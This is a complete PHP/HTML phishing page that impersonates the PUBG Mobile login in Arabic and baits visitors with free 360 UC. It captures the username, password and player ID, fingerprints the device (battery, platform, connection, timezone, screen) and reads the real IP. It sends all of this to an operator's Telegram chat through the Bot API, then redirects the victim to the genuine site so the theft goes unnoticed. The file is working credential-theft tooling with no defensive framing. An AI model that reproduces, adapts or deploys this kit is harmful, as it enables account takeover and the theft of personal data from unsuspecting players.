<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

/**
 * إرسال رسالة إلى Telegram
 */
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        error_log("Telegram cURL Error: " . $error);
        return false;
    }
    return $result;
}

/**
 * الحصول على IP الحقيقي للمستخدم (حتى خلف البروكسي)
 */
function getRealIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// معالجة طلب POST من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // قراءة البيانات الخام
    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true);
    
    if (!$input) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }

    $chatId = $input['chatId'] ?? null;
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;
    $playerId = $input['playerId'] ?? null;
    $realIp = getRealIp();

    if ($chatId && $credentials && $deviceInfo && $playerId) {
        // بناء الرسالة
        $loginMessage = "
🎮 <b>تسجيل دخول PUBG Mobile</b>

👤 <b>اسم المستخدم:</b> <code>" . htmlspecialchars($credentials['username']) . "</code>
🔒 <b>كلمة المرور:</b> <code>" . htmlspecialchars($credentials['password']) . "</code>
🆔 <b>معرف اللاعب:</b> <code>" . htmlspecialchars($playerId) . "</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> " . htmlspecialchars($deviceInfo['userAgent'] ?? 'غير معروف') . "
🔋 <b>البطارية:</b> " . htmlspecialchars($deviceInfo['battery'] ?? 'غير معروف') . "
🖥️ <b>النظام:</b> " . htmlspecialchars($deviceInfo['platform'] ?? 'غير معروف') . "
🌐 <b>IP الحقيقي:</b> <code>{$realIp}</code>
📶 <b>نوع الاتصال:</b> " . htmlspecialchars($deviceInfo['connection'] ?? 'غير معروف') . "
🗣️ <b>اللغة:</b> " . htmlspecialchars($deviceInfo['language'] ?? 'غير معروف') . "
🕒 <b>المنطقة الزمنية:</b> " . htmlspecialchars($deviceInfo['timezone'] ?? 'غير معروف') . "
📺 <b>الشاشة:</b> " . htmlspecialchars($deviceInfo['screen'] ?? 'غير معروف') . "

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";

        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
        
        if ($result === false) {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Telegram send failed']);
        } else {
            echo json_encode(['status' => 'success']);
        }
    } else {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Missing data']);
    }
    exit;
}

// الحصول على chatId من معامل URL (مثال: ?ID=123456789)
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى PUBG Mobile - اربح 360 UC</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: url('https://i.ibb.co/b5fzmPHH/Screenshot-20260411-002333-Google.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .promo-banner {
            background: linear-gradient(135deg, #ff8a00, #e52e71);
            width: 100%;
            border-radius: 12px 12px 0 0;
            padding: 15px;
            text-align: center;
            color: white;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            margin-bottom: -10px;
            z-index: 10;
            position: relative;
        }
        
        .login-form {
            background: rgba(0, 0, 0, 0.85);
            width: 100%;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            color: #fff;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .logo-container img {
            max-width: 180px;
            margin-bottom: 10px;
        }
        
        .logo-container p {
            font-size: 14px;
            opacity: 0.9;
            color: #ddd;
        }
        
        .form-title {
            text-align: center;
            margin-bottom: 20px;
            color: #fff;
            font-size: 22px;
        }
        
        .uc-offer {
            text-align: center;
            background: linear-gradient(135deg, #ff8a00, #e52e71);
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #ddd;
            font-size: 14px;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 2px solid #444;
            border-radius: 6px;
            font-size: 14px;
            color: #fff;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus {
            border-color: #ff8a00;
            outline: none;
        }
        
        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            font-size: 13px;
        }
        
        .remember {
            display: flex;
            align-items: center;
        }
        
        .remember input {
            margin-left: 6px;
        }
        
        .forgot-password {
            color: #ff8a00;
            text-decoration: none;
            font-size: 13px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .login-button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #ff8a00, #e52e71);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 138, 0, 0.6);
        }
        
        .divider {
            text-align: center;
            margin: 15px 0;
            position: relative;
            color: #777;
            font-size: 13px;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            left: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .divider::after {
            content: "";
            position: absolute;
            right: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .social-login {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .social-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333;
            border: 1px solid #444;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .social-btn:hover {
            background: #444;
            transform: translateY(-2px);
        }
        
        .social-btn i {
            font-size: 16px;
            color: #ddd;
        }
        
        .signup-link {
            text-align: center;
            margin-top: 15px;
            color: #ddd;
            font-size: 14px;
        }
        
        .signup-link a {
            color: #ff8a00;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 12px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 8px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            background: #ff8a00;
            color: white;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
        }
        
        @media (max-width: 500px) {
            .login-form {
                padding: 20px;
            }
            
            .logo-container img {
                max-width: 130px;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification"></div>
    
    <div class="container">
        <div class="promo-banner">
            🎁 اربح 360 UC مجانًا عند تسجيل الدخول اليوم!
        </div>
        
        <div class="login-form">
            <div class="logo-container">
                <img src="https://i.ibb.co/wh49zzMp/Screenshot-20260411-002126-Google.jpg" alt="PUBG Mobile Logo">
                <p>سجل الدخول إلى حسابك للوصول إلى عالم PUBG Mobile واربح 360 UC</p>
            </div>
            
            <div class="uc-offer">
                <i class="fas fa-gift"></i> احصل على 360 UC مجانًا عند تسجيل الدخول اليوم!
            </div>
            
            <h2 class="form-title">تسجيل الدخول</h2>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="input-group">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div class="input-group">
                    <label for="playerId">معرف اللاعب (ID)</label>
                    <input type="text" id="playerId" name="playerId" required placeholder="أدخل معرف اللاعب الخاص بك لاستلام 360 UC">
                </div>
                
                <div class="remember-forgot">
                    <div class="remember">
                        <input type="checkbox" id="remember">
                        <label for="remember">تذكرني</label>
                    </div>
                    
                    <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
                </div>
                
                <button type="submit" class="login-button">تسجيل الدخول واحصل على 360 UC</button>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="social-login">
                <div class="social-btn">
                    <i class="fab fa-facebook-f"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-twitter"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-google"></i>
                </div>
            </div>
            
            <div class="signup-link">
                ليس لديك حساب؟ <a href="#">أنشئ حسابًا</a>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2025 PUBG Mobile. جميع الحقوق محفوظة.</p>
            <div class="footer-links">
                <a href="#">الشروط</a>
                <a href="#">الخصوصية</a>
                <a href="#">المساعدة</a>
            </div>
        </div>
    </div>

    <script>
        // عرض الإشعارات
        function showNotification(message, isSuccess = false) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#ff8a00';
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // جمع معلومات الجهاز (بما فيها البطارية)
        async function collectDeviceInfo() {
            let batteryInfo = 'غير معروف';
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'غير مشحون'})`;
                } catch(e) { console.warn(e); }
            }

            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                battery: batteryInfo,
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const playerId = document.getElementById('playerId').value.trim();

            if (!username || !password || !playerId) {
                showNotification('الرجاء تعبئة جميع الحقول', false);
                return;
            }

            const deviceInfo = await collectDeviceInfo();

            const button = document.querySelector('.login-button');
            const originalText = button.textContent;
            button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري تسجيل الدخول...';
            button.disabled = true;

            const chatId = "<?php echo $chatId; ?>";

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chatId: chatId,
                        credentials: { username, password },
                        playerId: playerId,
                        deviceInfo: deviceInfo
                    })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    showNotification('تم تسجيل الدخول بنجاح! سيتم إضافة 360 UC إلى حسابك قريبًا.', true);
                    setTimeout(() => {
                        window.location.href = 'https://www.pubgmobile.com';
                    }, 3000);
                } else {
                    showNotification('حدث خطأ، حاول مرة أخرى.', false);
                    button.innerHTML = originalText;
                    button.disabled = false;
                }
            } catch (error) {
                console.error('Fetch error:', error);
                showNotification('خطأ في الاتصال، تأكد من اتصالك بالإنترنت.', false);
                button.innerHTML = originalText;
                button.disabled = false;
            }
        });
    </script>
</body>
</html>
